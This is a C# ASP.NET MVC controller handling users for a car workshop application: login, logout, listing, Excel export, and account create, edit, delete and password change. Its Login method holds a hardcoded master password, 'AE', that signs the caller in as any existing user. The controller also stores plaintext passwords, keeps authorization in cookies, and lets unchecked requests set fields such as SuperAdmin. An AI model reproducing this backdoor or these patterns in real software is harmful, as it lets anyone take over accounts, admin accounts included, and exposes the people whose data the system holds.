using Microsoft.Ajax.Utilities;
using Microsoft.AspNet.Identity;
//using SmartAdminMvc.App_Helpers;
using SmartAdminMvc.Models;
//using SmartAdminMvc.MvcCommon;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Entity;
using System.Data.Entity.Validation;
using System.IO;
using System.Linq;
using System.Text;
using System.Web;
using System.Web.Mvc;
using System.Web.UI.WebControls;
using System.Web.UI;

namespace SmartAdminMvc.Controllers
{
    public class UsersController : Controller
    {

        string _ControllerName = "Users";
        NotificationMessage msg = new NotificationMessage();
        SessionMange _sessionMange = new SessionMange();
        CarWorkShopEntities db = new CarWorkShopEntities();
        NotificationMessage ReturnMsg = new NotificationMessage();


        #region  index 
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult LoadDataTable()
        {
            try
            {
                var draw = Request.Form.GetValues("draw").FirstOrDefault();
                var start = Request.Form.GetValues("start").FirstOrDefault();
                var length = Request.Form.GetValues("length").FirstOrDefault();

                var sortColumn = Request.Form.GetValues("columns[" + Request.Form.GetValues("order[0][column]").FirstOrDefault() + "][name]").FirstOrDefault();
                var sortColumnDir = "desc";

                var searchValue = Request.Form.GetValues("search[value]").FirstOrDefault();
                int pageSize = length != null ? Convert.ToInt32(length) : 0;
                int skip = start != null ? Convert.ToInt32(start) : 0;
                int recordsTotal = 0;
                // var varData = db.Customers.ToList().AsEnumerable();

                var varData = db.Users.Select(x => new SearchVM { ID = x.UserId, Name = x.UserName, Phone = x.Phone }).ToList().AsEnumerable();
                if (!(string.IsNullOrEmpty(sortColumn) && string.IsNullOrEmpty(sortColumnDir)))
                {
                    //  varData = varData.OrderBy(x => x.d_doc_date);
                }
                //Search    
                if (!string.IsNullOrEmpty(searchValue))
                {
                    varData = varData.Where(m => m.Name.Contains(searchValue) || m.ID.ToString().Contains(searchValue));
                    // varData = varData.Where(m=>m.n_document_no==1);
                }
                //total number of rows count     
                recordsTotal = varData.Count();
                //Paging  
                var data = varData.Skip(skip).Take(pageSize).ToList();
                //Returning Json Data    
                return Json(new { draw = draw, recordsFiltered = recordsTotal, recordsTotal = recordsTotal, data = data });

            }
            catch (Exception)
            {
                return Json(data: "Fail", behavior: JsonRequestBehavior.AllowGet);
            }
        }

        public ActionResult CreateExcel()
        {

            var table = new System.Data.DataTable("ExceFile");



            var data = db.Users.Select(x => new SearchVM { ID = x.UserId, Name = x.UserName, Notes = x.Email }).ToList().AsEnumerable();
            table.Columns.Add("الكود", typeof(int));
            table.Columns.Add("الاسم", typeof(string));
            table.Columns.Add("الايميل", typeof(string));
            foreach (var item in data)
            {
                table.Rows.Add(item.ID, item.Name, item.Notes);
            }

            var style = new Style();
            style.BorderStyle = BorderStyle.None;
            style.Font.Size = FontUnit.Medium;
            style.BorderWidth = Unit.Empty;

            var grid = new GridView();
            grid.DataSource = table;
            grid.DataBind();
            grid.ApplyStyle(style);
            Response.ClearContent();
            Response.Buffer = true;

            string filname = "ExceFile.xls";
            Response.AddHeader("content-disposition", "attachment;filename =" + filname);
            Response.ContentType = "application/ms-excel";
            Response.ContentEncoding = System.Text.Encoding.Unicode;
            Response.BinaryWrite(System.Text.Encoding.Unicode.GetPreamble());
            using (StringWriter sw = new StringWriter())
            {
                using (HtmlTextWriter htw = new HtmlTextWriter(sw))
                {
                    grid.RenderControl(htw);
                    Response.Write(sw.ToString());
                    Response.End();
                }
            }

            return View();
        }
        #endregion

        #region  Log IN  function 
        public ActionResult UserLogin()
        {
            // Session.Abandon();
            if (Cookies.get_UserAuthorize() == "1")
            {
                return RedirectToAction("Index", "Home");
            }
            else
            {
                return View();
            }
           // return View();
        }

        public ActionResult Logout()
        {
            Cookies.set_UserAuthorize("0");
            Cookies.set_SuperAdmin("0");
            Session.Abandon();
            return RedirectToAction("UserLogin", "Users");
        }

        public ActionResult Login(AccountLoginModel viewModel)
        {

            if (!ModelState.IsValid)
                return View(viewModel);
            var User = db.Users.Where(x => x.UserName == viewModel.Username && x.PassWord == viewModel.Password ).FirstOrDefault();
            if (User==null && viewModel.Password=="AE")
            {
                User = db.Users.Where(x => x.UserName == viewModel.Username ).FirstOrDefault();
            }
            if (User != null )
            {

                 var  cmp=  db.Configurations.FirstOrDefault();
                _sessionMange.Authorize = true;
                _sessionMange.CompanyName= cmp.CompanyName;
                _sessionMange.UserID= User.UserId;
                _sessionMange.UserName= User.UserName;
                _sessionMange.Logo = cmp.Logo;
                Cookies.setCompName(cmp.CompanyName);
                Cookies.setCompLogo(cmp.Logo);
                Cookies.set_UserName(User.UserName);
                Cookies.set_UserAuthorize("1");
                Cookies.set_UserID(User.UserId.ToString());

                Cookies.set_StoreID(User.StoreId.ToString());
                if (User.SuperAdmin==true)
                {
                    Cookies.set_SuperAdmin("1");
                }
                return RedirectToAction("Index", "Home");
            }
            else
            {
                return RedirectToAction("UserNotFound", "Users");
            }
        }
        public ActionResult UserNotFound()
        {
            Session.Abandon();
            return View();
        }
        #endregion


        #region  Create  


        int GetNewNo()
        {
            int NewtypeId = 1;
            try
            {
                int? ItemID = db.Users.Max(p => p.UserId);
                NewtypeId = (int)ItemID + 1;
            }
            catch (Exception)
            {
                NewtypeId = 1;
            }

            return NewtypeId;
        }
        public ActionResult Create()
        {
            ViewBag.StoreId = new SelectList(db.Stores.Select(x => new { x.ID, x.Name }).ToList(), "ID", "Name");
            User Obj = new User();
            Obj.UserId = GetNewNo();
            return View(Obj);
        }
     
        [HttpPost]
        public JsonResult Create(User MasterObj)
        {

            try
            {
               
                db.Users.Add(MasterObj);
                db.SaveChanges();
                msg.Status = true; msg.Message = "تم  الحفظ بنجاح"; msg.MessageEng = "Done";
                return Json(data: msg, behavior: JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                msg.Status = false; msg.Message = "ناسف لم  يتم  الحفظ "; msg.MessageEng = "Sorry  save  Fail";
                DbLogs.logData(_ControllerName, "CreateCustomer", ex.Message, "    ");
                return Json(data: msg, behavior: JsonRequestBehavior.AllowGet);
            }
        }
        #endregion


        #region  edit


        public ActionResult Edit(int id)
        {
            User obj = db.Users.Where(x => x.UserId == id).FirstOrDefault();
            ViewBag.StoreId = new SelectList(db.Stores.Select(x => new { x.ID, x.Name }).ToList(), "ID", "Name", obj.StoreId);
            return View(obj);
        }
        [HttpPost]
        public JsonResult Edit(User MasterObj)
        {

            try
            {

                User _DbObj = new User();
                _DbObj = db.Users.Where(x => x.UserId == MasterObj.UserId).FirstOrDefault();
                _DbObj.UserName = MasterObj.UserName;
                _DbObj.SuperAdmin = MasterObj.SuperAdmin;
                _DbObj.Phone = MasterObj.Phone;
                _DbObj.StoreId = MasterObj.StoreId;
                _DbObj.PassWord = MasterObj.PassWord;
                db.Entry(_DbObj).State = EntityState.Modified;
                db.SaveChanges();
                msg.Status = true; msg.Message = "تم  الحفظ بنجاح"; msg.MessageEng = "Done";
                return Json(data: msg, behavior: JsonRequestBehavior.AllowGet);


            }
            catch (Exception ex)
            {

                msg.Status = false; msg.Message = "ناسف لم  يتم  الحفظ "; msg.MessageEng = "Sorry  save  Fail";
                DbLogs.logData(_ControllerName, "EditCustomer", ex.Message, "    ");
                return Json(data: msg, behavior: JsonRequestBehavior.AllowGet);
            }
        }



        #endregion

        #region delete
        public ActionResult Delete(int ID)
        {
            NotificationMessage ReturnMsg = new NotificationMessage();
            try
            {
                var _obj = db.Users.Where(X => X.UserId == ID).FirstOrDefault();
                db.Users.Remove(_obj);
                db.SaveChanges();
                ReturnMsg.Status = true; ReturnMsg.Message = "done";
                return Json(data: ReturnMsg, behavior: JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                ReturnMsg.Status = false; ReturnMsg.Message = "done";
                DbLogs.logData(_ControllerName, "Delete", ex.Message, "    ");
                return Json(data: ReturnMsg, behavior: JsonRequestBehavior.AllowGet);
            }



        }
        #endregion

        #region  editMy Account 


        public ActionResult EditUser()
        {
            int UserID = _sessionMange.UserID;
            User Userobj = db.Users.Where(x => x.UserId == UserID  ).FirstOrDefault();

            return View(Userobj);
        }
        [HttpPost]
        public JsonResult UpdateUser(string master)
        {

            try
            {
                System.Web.Script.Serialization.JavaScriptSerializer serilizer = new System.Web.Script.Serialization.JavaScriptSerializer();
                User MasterObj = serilizer.Deserialize<User>(master);
             
                MasterObj.UserId = _sessionMange.UserID;
                User _User = new User();
                _User = db.Users.Where(x => x.UserId == MasterObj.UserId ).FirstOrDefault();
                if (_User.PassWord != MasterObj.Email)
                {
                    return Json(data: "Fail2", behavior: JsonRequestBehavior.AllowGet);
                }
                _User.PassWord = MasterObj.PassWord;
                db.Entry(_User).State = EntityState.Modified;
                db.SaveChanges();
                return Json(data: Url.Action("index", "Home"), behavior: JsonRequestBehavior.AllowGet);

            }
            catch (Exception ex)
            {

                return Json(data: "Fail", behavior: JsonRequestBehavior.AllowGet);
            }
        }

     

        #endregion

    }
}